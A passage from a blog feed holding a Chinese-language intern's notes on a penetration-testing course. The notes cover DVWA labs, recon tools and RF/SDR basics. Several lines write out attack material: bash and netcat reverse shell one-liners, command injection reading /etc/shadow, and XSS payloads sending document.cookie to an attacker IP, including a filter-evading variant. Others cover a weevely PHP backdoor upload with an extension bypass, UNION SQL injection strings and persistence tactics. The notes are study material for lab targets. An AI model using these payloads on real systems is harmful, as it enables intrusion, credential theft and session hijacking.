src="https://i.imgur.com/l3j0kFf.png"><br>AZ是區域內的一個資料中心或一組資料中心。可用區域各自坐落於彼此的數十英里外。這個距離夠近，足以在可用區域之間維持低延遲 (內容從請求到接收之間的時間)。不過，如果區域中的一部分發生災難，它們的距離也夠遠，足以降低多個可用區域受到影響的機會。</p><h2 id="節點"><a href="#節點" class="headerlink" title="節點"></a>節點</h2><p>是透過 CloudFront 來將您內容的快取副本存放在更靠近客戶位置的站點，以便加快交付<br><img src="https://i.imgur.com/LEbdL9B.png"></p>]]></content>
      
      
      <categories>
          
          <category> 學習筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWS </tag>
            
            <tag> Certificate </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>實習筆記-滲透測試課程</title>
      <link href="/posts/8ec27a58.html"/>
      <url>/posts/8ec27a58.html</url>
      
        <content type="html"><![CDATA[<p>課程內容:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">- Web基本知識</span><br><span class="line">- 主動/被動資訊收集</span><br><span class="line">- 常見的web漏洞</span><br><span class="line">- 靶機</span><br><span class="line">- DVWA（Damn Vulnerable Web Application）</span><br><span class="line">- RF(無線射頻)滲透測試(物聯網)</span><br><span class="line">- 基本的通訊協定</span><br><span class="line">- 軟體定義無線電SDR</span><br></pre></td></tr></table></figure><h2 id="PT-滲透測試-vs-RT-紅隊演練"><a href="#PT-滲透測試-vs-RT-紅隊演練" class="headerlink" title="PT(滲透測試) vs RT(紅隊演練)"></a>PT(滲透測試) vs RT(紅隊演練)</h2><ul><li>PT:範圍較小，且無法針對社交工程 ex.某個網頁</li><li>RT:範圍較大 ex.整個公司</li></ul><p>黑箱:最貼近真實情境<br>白箱:盡可能提供相關資訊給受測者<br>灰箱:黑白箱混和，會提供自我宣告表以後再給受測者測試</p><h2 id="滲透測試流程"><a href="#滲透測試流程" class="headerlink" title="滲透測試流程:"></a>滲透測試流程:</h2><ol><li>資料蒐集</li><li>透洞掃描</li><li>漏洞利用<br> 白帽:<ol start="4"><li>漏洞回報<br> 黑帽:</li><li>提權限</li><li>持續性存取</li><li>防禦逃脫(逃脫會叫的那種警報器)</li><li>資料攜出(把DB分批攜出)<br><img src="https://i.imgur.com/10o9kG8.jpg"></li></ol></li></ol><h2 id="IOT的攻擊向量-Attack-Vector"><a href="#IOT的攻擊向量-Attack-Vector" class="headerlink" title="IOT的攻擊向量(Attack Vector)"></a>IOT的攻擊向量(Attack Vector)</h2><p><img src="https://i.imgur.com/CFMACnJ.jpg"></p><ul><li>Hardware:Physical Interface<br>  給開發人員使用，出廠後並未關掉，若能訪問到該接口通常都能直接取得root，通常底層皆為明文傳輸<ul><li>設備外殼並未提供保護機制</li><li>底層使用明文傳輸</li><li>毛刺攻擊(Glitching):用微小的電壓，去擾動硬體設備</li><li>測信到攻擊(Side Channel Attack):加密晶片，可以去量測他的電壓、音頻…，用這些東西去分析加密的方式、Key等等</li></ul></li><li>韌體(Firmware):Hardcode, Enc key, exploit<ul><li>軟體&#x2F;韌體未進行加密</li><li>有敏感資料</li></ul></li><li>Software:Andriod app</li><li>Radio:Cellular, WiFi, 蜂窩網路<ul><li>無線通訊未加密可進行嗅探(Sniffer)</li><li>干擾攻擊(Jamming)</li><li>重放攻擊</li><li>模糊攻擊(fuzz):需先擬向工程才能fuzz</li><li>通訊協定:最麻煩，需要原廠處理</li></ul></li><li>Cloud:<ul><li>API攻擊</li><li>注入攻擊</li><li>身分認證&#x2F;授權機制</li><li>邏輯漏洞</li><li>web漏洞</li></ul></li></ul><h2 id="網頁的攻擊向量"><a href="#網頁的攻擊向量" class="headerlink" title="網頁的攻擊向量"></a>網頁的攻擊向量</h2><p><img src="https://i.imgur.com/zfkdfrI.jpg"><br>Web1.0</p><ul><li>布告欄的概念</li><li>只有靜態網頁</li></ul><p>Web2.0</p><ul><li>可讀寫，多功能的動態頁面</li><li>應用程序</li><li>DB(個資)</li><li>API</li><li>不同用戶會有不同的頁面</li></ul><p>Web3.0</p><ul><li>去中心化(資料分散放)</li></ul><p>HTTP</p><ul><li>由Request&#x2F;Response組成</li><li>由於HTTP屬於無狀態，因此需依賴cookie機制來記錄user資訊與time</li><li>狀態碼<br>  <img src="https://i.imgur.com/Bk1hb59.png"></li></ul><h2 id="攻擊標的"><a href="#攻擊標的" class="headerlink" title="攻擊標的"></a>攻擊標的</h2><ol><li>使用者身分</li></ol><ul><li>認證</li><li>權限劃分</li><li>Session<br>ex.HTTP封包格式皆相同，該基站</li></ul><ol start="2"><li>輸入輸出:</li></ol><ul><li>Sql Injection</li><li>Command Injection</li><li>需經過正規化處理</li><li>開發者需要設定確定的字元<br>ex. 數字欄位填中文或英文</li></ul><ol start="3"><li>程式邏輯</li></ol><h2 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具:"></a>常用工具:</h2><p>Information Gathering:分為主動、被動</p><ul><li><p>主動資訊蒐集<br>  <img src="https://i.imgur.com/M9nPHnv.png"></p><ul><li>nmap主動蒐集目標資訊:掃描目標主機port<br>  <img src="https://i.imgur.com/GTvO6kr.jpg"></li><li>Nikto開源的網站弱點掃描工具:自帶在Kali內</li><li>Dirb暴力枚舉網頁下的目錄與檔案  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dirb url</span><br><span class="line">#去看網頁內存不存在敏感資料</span><br><span class="line">#有可能可以掃出使用者的路徑</span><br><span class="line">#如果有開阿帕契作為中繼站，能掃出來</span><br></pre></td></tr></table></figure></li></ul></li><li><p>被動資訊蒐集</p><ul><li><p>用被動資料(IP、姓名、生日..)來描述目標</p></li><li><p>不與目標直接接觸，避免留下痕跡</p></li><li><p>SHODAN</p><ul><li>可以掃描世界上所有的物聯網設備</li><li>主機</li><li>開啟端口</li><li>是否有已知漏洞</li><li>可使用下方關鍵字搜尋:<ul><li>hostname：搜尋指定的主機或域名，例如 hostname:”google”</li><li>port：搜尋指定的埠或服務，例如 port:”21”</li><li>country：搜尋指定的國家，例如 country:”CN”</li><li>city：搜尋指定的城市，例如 city:”Hefei”</li><li>org：搜尋指定的組織或公司，例如 org:”google”</li><li>isp：搜尋指定的ISP供應商，例如 isp:”China Telecom”</li><li>product：搜尋指定的作業系統&#x2F;軟體&#x2F;平臺，例如 product:”Apache httpd”</li><li>version：搜尋指定的軟體版本，例如 version:”1.6.2”</li><li>geo：搜尋指定的地理位置，引數為經緯度，例如 geo:”31.8639, 117.2808”</li><li>before&#x2F;after：搜尋指定收錄時間前後的資料，格式為dd-mm-yy，例如 before:”11-11-15”</li><li>net：搜尋指定的IP地址或子網，例如net:”210.45.240.0&#x2F;24”</li><li>參考:<ul><li><a href="https://www.tp1rc.edu.tw/tpnet2020/training/1090303.pdf">https://www.tp1rc.edu.tw/tpnet2020/training/1090303.pdf</a></li><li><a href="https://www.itread01.com/content/1546699324.html">https://www.itread01.com/content/1546699324.html</a></li></ul></li></ul></li></ul></li><li><p>Google Hacking</p><ul><li>用Google Search針對目標進行情報搜尋</li><li>用”site:”去搜尋</li></ul></li></ul></li><li><p>過濾封包</p><ul><li>Burp Suite<br>  使用方法:<br>  使用Kali 開啟Burp Site<br>  <img src="https://i.imgur.com/8gomHwp.png"><br>  開啟proxy 表示之後所有流量都會經過burp<br>  &lt;之前的版本需要簽憑證&gt;<br>  使用Proxy開啟browser<br>  <img src="https://i.imgur.com/dWxhFur.png"><br>  進到project option&gt;MIST&gt;勾選Enable<br>  <img src="https://i.imgur.com/vswHeoq.png"><br>  就可以繼續使用proxy<br>  <img src="https://i.imgur.com/HwXBX1w.png"><br>  將IPor網址執行於瀏覽器中，封包就會被攔截進brower<br>  <img src="https://i.imgur.com/OATh3RT.png"><br>  <br><br></li></ul></li><li><p>暴力破解<br>  <img src="https://i.imgur.com/YuudCcZ.png"><br>  <img src="https://i.imgur.com/kf2mOL5.png"><br>  不同的Attack type有不同模式<br>  sniper:針對字典中設定的值交替順序測試<br>  <img src="https://i.imgur.com/An2qwjw.png"><br>  將存取內容傳到Repeater確認回應結果<br>  <img src="https://i.imgur.com/Tgird85.png"></p><p>  <img src="https://i.imgur.com/nwWHDyM.png"></p></li></ul><br><h2 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h2><p>因為沒有針對用戶輸入進行過濾，因此會造成機敏資料外洩、等問題<br>Linux command</p><table><thead><tr><th>Column 1</th><th>Column 2</th></tr></thead><tbody><tr><td>; or &amp;</td><td>不管第一次執行的指令是否成功皆會執行第二個</td></tr><tr><td>&amp;&amp;</td><td>第一個指令失敗不會執行下一個</td></tr><tr><td>I(槓槓符號)</td><td>會把前一個指令的輸出當作下一個指令的輸入</td></tr><tr><td>II(槓槓符號)</td><td>會把前一個指令的輸出當作下一個指令的輸入</td></tr></tbody></table><hr><h2 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h2><p>1.Enter IP to get shell</p><p><img src="https://i.imgur.com/GZG7eOA.png"><br>可使用command加入一些linux指令<br><img src="https://i.imgur.com/FI8yUNJ.png"></p><p><img src="https://i.imgur.com/33iCHlV.png"><br>cat去撈 &#x2F;etc&#x2F;shadow<br><img src="https://i.imgur.com/zthZGDt.png"><br>ls -al 查看檔案權限<br><img src="https://i.imgur.com/Fl5HR9S.png"></p><p>ls -al | grep shadow<br>linux<br>&#x2F;etc&#x2F;passwd linux以前會把所有帳密放在裡面<br>&#x2F;etc&#x2F;shadow 現在linux會將它分開</p><h4 id="Reverse-shell"><a href="#Reverse-shell" class="headerlink" title="Reverse shell"></a><em>Reverse shell</em></h4><p>受害者的機器自行連回攻擊者的機器(出來比進去簡單)</p><p><strong>Bash</strong></p><ul><li>Victim: bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1</li><li>Attacker:nc -nvlp port</li></ul><p><strong>Netcat</strong></p><ul><li>Victim:nc ip port -e &#x2F;bin&#x2F;bash</li><li>Attacker:nc -nvlp port</li></ul><p><img src="https://i.imgur.com/WHPfdBH.png"></p><p><strong>john the ripper</strong>暴力破解<br>可以參考Linux 的 &#x2F;etc&#x2F;shadow 檔案結構<br><a href="https://blog.gtwang.org/linux/linux-etc-shadow-file-format/">https://blog.gtwang.org/linux/linux-etc-shadow-file-format/</a></p><p>xdg-open &gt;&gt; 呈現file讓你可以直接開啟文件</p><br><p><strong>破解liunx root密碼</strong><br>將passwd和shadow合併 寫入crack中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unshadow passwd shadow &gt; crack</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/vRRh7bK.png"><br>使用john來破解密碼<br><img src="https://i.imgur.com/JiAkG0d.png"></p><p><strong>破解Window root密碼</strong><br>SAM file<br>NTLM hash<br>Net-NTLM 網路上做金鑰交換的地方</p><p><strong>CVE Details</strong><br>可以去追蹤<br>不會有要怎麼利用該漏洞的程式碼<br><strong>Expoitdb</strong><br>可以追蹤漏洞<br>remote code execution(RCE)遠程代碼執行漏洞</p><p><strong>Metasploit</strong><br><a href="https://ithelp.ithome.com.tw/articles/10224527">https://ithelp.ithome.com.tw/articles/10224527</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/fGYsqLW.png"></p><p><img src="https://i.imgur.com/nUGB4m6.png"></p><h2 id="靶機測試-192-168-5-107"><a href="#靶機測試-192-168-5-107" class="headerlink" title="靶機測試(192.168.5.107)"></a>靶機測試(192.168.5.107)</h2><h3 id="NET-config"><a href="#NET-config" class="headerlink" title="NET config"></a>NET config</h3><p>網路要使用橋接介面卡</p><ol><li><p>&lt;資料蒐集&gt;先測試受害機的port有什麼是開啟的<br>使用nmap查看已開啟的port<br><img src="https://i.imgur.com/4YYhxLY.png"><br>可以查看bin裡面有什麼command可以使用<br><img src="https://i.imgur.com/5HngrIj.png"></p></li><li><p>&lt;利用弱點&gt;登入<br>使用SQL Injection去登入</p></li><li><p>使用受害者電腦連回攻擊者電腦<br>可使用下方這兩個去</p></li></ol><ul><li>bash</li><li>netcat</li></ul><ol start="4"><li><p>&lt;資料蒐集&gt;蒐集受害者電腦資訊</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br><span class="line">uname-a</span><br><span class="line">lsb_release -a</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/W7DQDcI.png"></p></li><li><p>&lt;弱點掃描&gt;使用exploitsdb查詢漏洞<br> <img src="https://i.imgur.com/IajKmAT.png"></p><p> <img src="https://i.imgur.com/BFOaibq.png"></p></li><li><p>在本地電腦開啟apache服務<br> <img src="https://i.imgur.com/6Cimn6A.png"><br> 開啟畫面如下<br> <img src="https://i.imgur.com/TZk5bR6.png"><br> 將需要的檔案放進apache資料夾中，使得之後受害電腦可以下載apache中的資料<br> <img src="https://i.imgur.com/AO8UQ2n.png"><br> <img src="https://i.imgur.com/Pe9lYUr.png"></p></li><li><p>&lt;利用漏洞&gt;在受害者電腦中下載漏洞檔案<br> 使用pwd確認位址指向tmp<br> (由於權限不足因此需要找一個當前權限可以讀寫的位址)<br> 使用wget下載本機開啟的apache<br> <img src="https://i.imgur.com/RdeYP6B.png"><br> <img src="https://i.imgur.com/wVEsi1U.png"><br> 確認權限<br> <img src="https://i.imgur.com/oc9Q7jV.png"></p></li></ol><h3 id="File-Upload"><a href="#File-Upload" class="headerlink" title="File Upload"></a>File Upload</h3><p>使用weevely生成backdoor.php<br><img src="https://i.imgur.com/perGeXy.png"><br>將檔案上傳回dvwa的網站<br><img src="https://i.imgur.com/uZlHxZq.png"><br>使用weevely連到該上傳路徑</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weevely http://IP/dvwa/hackable/uploads/backdoor.php pwd(密碼)</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/PkDJBTn.png"><br>查看開主機狀態<br><img src="https://i.imgur.com/L9KupbP.png"></p><p>&lt;中等難度&gt;<br>前端會擋非image會擋<br>先將惡意檔案改成.jpeg</p><p>上傳該檔案，使用burp suite攔截封包，並將封包內檔名更改為php即可<br><img src="https://i.imgur.com/DKwFDBe.png"></p><h3 id="LFI-Local-File-Inclusion"><a href="#LFI-Local-File-Inclusion" class="headerlink" title="LFI(Local File Inclusion)"></a>LFI(Local File Inclusion)</h3><p>本地文件包含漏洞(LFI)</p><p>敏感檔案:</p><ul><li><strong>&#x2F;etc&#x2F;passwd</strong></li><li><strong>&#x2F;var&#x2F;log&#x2F;auth.log</strong><ul><li>紀錄哪些user連這台機器</li></ul></li><li><strong>&#x2F;var&#x2F;log&#x2F;apacke2&#x2F;access.log&#x2F;error.log</strong><ul><li>有出現過哪些錯誤訊息</li></ul></li><li><strong>..&#x2F;..&#x2F;..&#x2F;</strong><ul><li>可以去翻他有那些檔案</li></ul></li><li><strong>%WINDIR%\win.ini</strong><ul><li>win設定檔，可以看config</li></ul></li></ul><p>可以在?page&#x3D;後面放入<strong>絕對路徑</strong>來查找資料<br><img src="https://i.imgur.com/KLw7zdD.png"></p><p><img src="https://i.imgur.com/2pHxd91.png"></p><p><img src="https://i.imgur.com/QGulfsK.png"></p><h3 id="RFI-Remote-File-Inclusion"><a href="#RFI-Remote-File-Inclusion" class="headerlink" title="RFI(Remote File Inclusion)"></a>RFI(Remote File Inclusion)</h3><p>有RFI漏洞<br>需要開啟funcion:</p><ul><li>allow_url_fopen</li><li>allow_url_include</li></ul><p><img src="https://i.imgur.com/DDVoXPL.png"></p><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>跨腳本攻擊(Cross Site Scripting)<br>攻擊對象為user端，非server端</p><p>漏洞利用條件</p><ul><li>伺服器對用戶提交數據過濾不夠嚴謹</li><li>使用社交工程讓受害者點擊觸發<br>影響:</li><li>重定向(掛馬)不應該被倒到的網站</li><li>盜取cookie</li><li>釣魚<br>類型:</li><li>反射型:返回腳本並由user要去點擊才會中招</li><li>儲存型:js code 存在server端，不管user有沒有點擊，都會觸發。</li></ul><p>下js code</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&quot;call 911&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/T3rDDKJ.png"><br><img src="https://i.imgur.com/oOGulM2.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/191wpbd.png"><br><img src="https://i.imgur.com/0T1ttyT.png"></p><p>從user那邊偷到訊息傳到攻擊者端<br>監聽80 port<br>輸入js code 連到攻擊者IP回傳cookie</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;new image().src=&quot;http://ip/output=&quot;+document.cookie;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/Q0T1jW9.png"></p><p>&lt;中等難度&gt;<br>過濾掉script，則可以使用大小寫來混淆他<br>ex.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;sCripT&gt;new image().src=&quot;http://ip/output=&quot;+document.cookie;&lt;/sCripT&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/4Y4hqwD.png"></p><p><img src="https://i.imgur.com/e26A9bc.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p>XSS stored</p><p><img src="https://i.imgur.com/gJi4QzR.png"></p><p><img src="https://i.imgur.com/QEBAcB9.png"></p><h2 id="靶機測試2-192-168-0-182"><a href="#靶機測試2-192-168-0-182" class="headerlink" title="靶機測試2(192.168.0.182)"></a>靶機測試2(192.168.0.182)</h2><ol><li>蒐集資料<br>使用dirb蒐集網頁資料</li></ol><p>使用nmap -A 查看該主機有甚麼Port是開啟的<br><img src="https://i.imgur.com/M19pxyW.png"><br>其中可以朝samba掃描&#x2F;攻擊<br>(samba的洞挺多的)</p><ol start="2"><li><p>開啟msfconsolse<br><img src="https://i.imgur.com/zXZNme2.png"></p></li><li><p>Search samba漏洞<br><img src="https://i.imgur.com/4FDBxJQ.png"></p></li><li><p>編譯漏洞腳本<br><img src="https://i.imgur.com/4LaDpTB.png"></p></li><li><p>執行漏洞腳本<br><img src="https://i.imgur.com/97zdWV8.png"><br>(即可連進去取得root)</p></li></ol><p>要怎麼維持連線程序????<br><strong>越貼近使用者行為越好越難發現</strong><br>1.建一個新的帳號<br>2.爆破它其他的帳號密碼<br>3.塞一個服務 (但有可能會被AD斷掉)<br>4.建一個連線回到自己主機 (但有可能會被AD斷掉)</p><p>How To Create a Sudo User in Linux?<br><a href="https://www.digitalocean.com/community/tutorials/how-to-create-a-sudo-user-on-ubuntu-quickstart">https://www.digitalocean.com/community/tutorials/how-to-create-a-sudo-user-on-ubuntu-quickstart</a></p><h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><p>攔截修改密碼的頁面<br><img src="https://i.imgur.com/FUBku23.png"></p><p>複製封包的URI<br><img src="https://i.imgur.com/1LTXzYP.png"></p><p>執行URI即可更改密碼<br><img src="https://i.imgur.com/POuyWXz.png"><br>將URI拿去縮短網址就能夠更加隱蔽</p><h3 id="XSS-CSRF-組合技"><a href="#XSS-CSRF-組合技" class="headerlink" title="XSS+CSRF 組合技"></a>XSS+CSRF 組合技</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;new Image().src=&quot;更改密碼的URI&quot;&lt;/script&gt;</span><br></pre></td></tr></table></figure><ul><li>反射型:點到這個圖片就會被更改</li><li>儲存型:登入後帶著cookie瀏覽到特定圖片就會被更改</li></ul><h3 id="SQL-Injection-脫庫"><a href="#SQL-Injection-脫庫" class="headerlink" title="SQL Injection(脫庫)"></a>SQL Injection(脫庫)</h3><p>server端並未經過過濾使用輸入SQL語法進行解析並將結果返回<br>SQL基礎使用:</p><ul><li>Select DB</li><li>Select table</li><li>Select column</li><li>Data</li></ul><p>登入DB</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -h IP</span><br><span class="line">show DB;</span><br><span class="line">use dvwa;</span><br><span class="line">show tables;</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/aK34Mju.png"><br><img src="https://i.imgur.com/pmUsGxs.png"></p><p>select<br><img src="https://i.imgur.com/2ljNhS8.png"><br><img src="https://i.imgur.com/dmWdah5.png"></p><p>Information Schema</p><ul><li>Information_schema.schemata 所有db</li><li>Information_schema.tables 所有table</li><li>Information_schema.columns 所有的欄位</li></ul><p><img src="https://i.imgur.com/Adjm06U.png"><br><img src="https://i.imgur.com/f6uOTKJ.png"></p><p>輸入1會產生ID1的資訊<br><img src="https://i.imgur.com/kpFZTul.png"><br>因此可以使用select語法輸入所有的db</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 &#x27; union select 1, schema_name from information_schema.schemata # </span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/iQecQTk.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 &#x27; union select 1, table_name from information_schema.tables # </span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/O5Ba3HO.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 &#x27; union select 1, table_name from information_schema.tables where table_name=&#x27;dvwa&#x27;# </span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/sLCOQpN.png"></p><p><img src="https://i.imgur.com/mRMPxDH.png"></p><p><img src="https://i.imgur.com/9QEBR9x.png"></p><hr><h2 id="好用資源"><a href="#好用資源" class="headerlink" title="好用資源"></a>好用資源</h2><ul><li>Payload All The Things<br><a href="https://github.com/swisskyrepo/PayloadsAllTheThings">https://github.com/swisskyrepo/PayloadsAllTheThings</a></li><li>GTFObins: 各種Reverse Shell<br><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></li><li>XSS Bypass Filter<br><a href="https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html</a></li></ul><hr><h2 id="RF-滲透測試"><a href="#RF-滲透測試" class="headerlink" title="RF 滲透測試"></a>RF 滲透測試</h2><p>安裝基本套件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gnuradio </span><br><span class="line">sudo apt-get install gr-osmosdr</span><br><span class="line">sudo apt-get install rtl-sdr</span><br><span class="line">rtl_test</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/Dpat9WW.png"></p><p><strong>開啟osmocom_fft</strong><br>osmocom_fft<br><img src="https://i.imgur.com/Ewe4E1Y.png"></p><h3 id="通訊概論"><a href="#通訊概論" class="headerlink" title="通訊概論"></a>通訊概論</h3><p>訊號：</p><ul><li>類比訊號(陸譯:模擬訊號):根據震幅的改變而產生的訊號，可以用來乘載訊號<ul><li>赫茲(Hz):每秒震盪幾次</li></ul></li><li>數位訊號:表示為0or1，不是用來乘載訊息的</li></ul><p>頻率:每秒震盪幾次，每秒周期數<br>頻寬:用來描述頻率的範圍，又稱為帶寬</p><p>fft 演算法:</p><ul><li>中心頻率(Center Frequency):(f max + f min)&#x2F;2</li><li>頻寬(Bandwideth, channel width): |f max- f min|</li></ul><p>頻譜分配:<br><img src="https://i.imgur.com/YFYcJnm.png"></p><p>ISM頻段:</p><ul><li>無需使用執照與向政府繳交費用</li><li>2.4GHz, 868Mhz</li></ul><p>Sub -1G頻段:</p><ul><li>小於1GHz的頻段被稱為Sub -1GHz</li></ul><p>發收端:調變-&gt;訊息X載波&#x3D;訊號<br>接收端:解調變</p><ul><li>類比調變<ul><li>頻率調變(FM):利用訊號頻率密度來表示</li><li>振幅調變(AM):利用訊號震幅高低表示</li><li>相位調變(PM):利用不同的相位(角度)來表示</li></ul></li><li>數位調變<ul><li>振幅偏移調變(ASK)</li><li>頻率偏移調變(FSK)</li><li>相位偏移調變(PSK)</li><li>正交分多工調變(OFDM) ex.WiFi</li></ul></li><li>比較<br>  <img src="https://i.imgur.com/dY7rAqQ.jpg"></li></ul><p>單工:純接收、純發射<br>半雙工:接收發射同時間下能擇一 ex.無線電<br>雙工:同時間下能透發射&amp;接收 ex.手機</p><p>電流:<br>導體上的電流 - 發射機(Tx) -&gt; air interface -&gt; 接收機(Rx) - 導體上的電流</p><p>Wireless IC Dongle<br><img src="https://i.imgur.com/1ZEd9lh.jpg"><br>SDR Flatforms<br><img src="https://i.imgur.com/W28jivl.jpg"></p><p>Wireless IC Dongle VS SDR Flatforms</p><ul><li>Wireless IC Dongle:收到訊號以後，將已解調訊號傳至電腦</li><li>SDR Flatforms:收到訊號以後，將未解調訊號傳至電腦</li></ul><p>增益VS損耗</p><ul><li>增益(Gain):輸出的訊號&gt;輸入的訊號 ,根據質量守恆定理，訊號不會無緣無故變大，因此會經過電流加大訊號</li><li>損耗(Loss):輸入的訊號&gt;輸出的訊號 ,透過發熱進行能量守恆的轉換</li></ul><p>使用分貝當作比較的條件</p><p>採樣定理:<br>將一個類比訊號經過採樣轉換成一個數位訊號，需要用幾個點表示一個波?</p><blockquote><p>&lt;fs採樣率  f採樣頻率 B頻寬&gt;</p></blockquote><ol><li>低通採樣定理:採樣率至少為採樣頻率的兩倍<br> fs &#x3D; 2 x f</li><li>帶通採樣定理:採樣率至少為頻寬的兩倍<br> fs &#x3D; 2 x B</li></ol><ul><li><p>抽取(Decimation):降低採樣率</p></li><li><p>內插(Interpolation):提高採樣率</p></li><li><p>混疊現象(Aliasing Effect):會發生在訊號中心頻率+-採樣率的頻率</p></li></ul><p>匹配:</p><ul><li>射頻訊號 阻抗 50 Ω(Ohm）</li><li>視頻訊號 阻抗 75 Ω(Ohm)</li><li>匹配不良:射頻信號會有反射問題，嚴重的話可能會燒掉</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gnuradio-companion</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/oKM0usX.png"></p><p>圖中每一個都是功能模組相連<br>NBFM Receive為解調訊號的Seceive，沒有它就不會work<br><img src="https://i.imgur.com/03kHTTz.png"></p><p>開啟一個新的流程圖<br>File&gt;New&gt;WX GUI<br><img src="https://i.imgur.com/zvMNJRR.png"><br>區域介紹<br><img src="https://i.imgur.com/o05gLr3.png"><br>RTL-SDR參數設定<br><img src="https://i.imgur.com/UCRfAXd.png"><br>可以更改變數，使所有和samp_rate之變數全部更改<br><img src="https://i.imgur.com/GgUS5UZ.png"></p><p>將rtl收到的所有訊號存到file<br><img src="https://i.imgur.com/bKGy7Eq.png"><br>給file_sink儲存的位址<br><img src="https://i.imgur.com/gAJTMBu.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inspectrum &lt;file&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/Jf8QIdk.png"></p><h3 id="元件"><a href="#元件" class="headerlink" title="元件"></a>元件</h3><p>有源:需要電源運作<br>無源:不須電源運作</p><ul><li><p>放大器:</p><ul><li>三種屬性:增益、噪聲係數、線性<ul><li>Gain:使用dB表示</li><li>噪聲係數:使用dB表示</li><li>線性:失真程度</li></ul></li><li>三類:低噪音、高功率、其他</li></ul></li><li><p>天線</p><ul><li>天線:接收訊號與發射訊號<ul><li>全向天線:全樣都有</li><li>指向天線:只有一個角度</li><li>增益天線:捨去電磁場﹑非功率增益而是方向增益</li><li>主動天線:必含功率增益</li></ul></li><li>頻率:決定天線的大小</li><li>傳播方向:決定天性的形狀<ul><li>全向:全樣都有</li><li>指向:只有一個角度</li></ul></li><li>功率:決定天線的大小</li></ul></li><li><p>濾波器</p><ul><li>已”頻率”劃分不同訊號<br>  <img src="https://i.imgur.com/A44cWOA.jpg"></li><li>頻率響應:超過他的憑率較果會下降</li><li>過濾你不要的頻率</li></ul></li><li><p>混頻器:</p><ul><li>改變訊號頻率，但保持其他特性，也就是做調變的功能</li><li>通常混頻器後面會接一個濾波器</li><li>比較沒辦法數位化</li></ul></li><li><p>振盪器:</p><ul><li>比較沒辦法數位化</li></ul></li><li><p>元件比較<br>  <img 